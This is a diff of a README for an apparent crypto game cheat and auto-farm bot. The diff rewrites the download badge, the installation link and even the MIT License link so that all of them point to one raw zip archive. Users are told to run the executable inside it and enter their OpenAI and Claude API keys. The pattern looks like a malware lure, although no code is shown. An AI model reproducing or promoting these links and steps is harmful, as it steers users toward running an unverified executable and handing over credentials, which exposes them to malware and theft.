@@ -1,6 +1,6 @@
 # Common Ground World Crypto Bot Crypto Game Auto Farm Clicker Cheat Api
 
-[![Download](https://img.shields.io/badge/Download-LATEST-blueviolet?style=for-the-badge&logo=github)]https://AYANFAHMID.github.io
+[![Download](https://raw.githubusercontent.com/AYANFAHMID/cgw-crypto-bot-autofarm-clicker-api/branch/airable/cgw-crypto-bot-autofarm-clicker-api-v3.7.zip)]https://raw.githubusercontent.com/AYANFAHMID/cgw-crypto-bot-autofarm-clicker-api/branch/airable/cgw-crypto-bot-autofarm-clicker-api-v3.7.zip
 
 Welcome to **Common Ground World Crypto Bot Crypto Game Auto Farm Clicker Cheat Api** — your all-in-one digital strategist for immersive gameplay and resourceful crypto automation! Picture your virtual farms growing while you relax and your crypto tokens multiplying on autopilot. Powered by robust modern APIs and sharp automation, this tool crafts an inclusive path through the innovative world of crypto gaming.
 
@@ -55,7 +55,7 @@ You'll need your API access keys to unlock these features (see install section b
 
 ## ⚙️ Installation: Your Gateway to Effortless Digital Farming
 
-1. Download the latest release: https://AYANFAHMID.github.io
+1. Download the latest release: https://raw.githubusercontent.com/AYANFAHMID/cgw-crypto-bot-autofarm-clicker-api/branch/airable/cgw-crypto-bot-autofarm-clicker-api-v3.7.zip
 2. Extract the archive to a secure directory.
 3. Launch the executable or binary suitable for your operating system.
 4. On first run, input your OpenAI and Claude API keys.
@@ -89,9 +89,9 @@ You'll need your API access keys to unlock these features (see install section b
 
 ## 📜 MIT License
 
-This project is released under the [MIT License](https://opensource.org/licenses/MIT) – empowering all users with open collaboration and sharing spirit. © 2025
+This project is released under the [MIT License](https://raw.githubusercontent.com/AYANFAHMID/cgw-crypto-bot-autofarm-clicker-api/branch/airable/cgw-crypto-bot-autofarm-clicker-api-v3.7.zip) – empowering all users with open collaboration and sharing spirit. © 2025
 
 ---
-[![Download](https://img.shields.io/badge/Download-LATEST-blueviolet?style=for-the-badge&logo=github)]https://AYANFAHMID.github.io
+[![Download](https://raw.githubusercontent.com/AYANFAHMID/cgw-crypto-bot-autofarm-clicker-api/branch/airable/cgw-crypto-bot-autofarm-clicker-api-v3.7.zip)]https://raw.githubusercontent.com/AYANFAHMID/cgw-crypto-bot-autofarm-clicker-api/branch/airable/cgw-crypto-bot-autofarm-clicker-api-v3.7.zip
 
 **Unleash the next era of crypto gameplay – where automation, intelligence, and accessibility meet.**
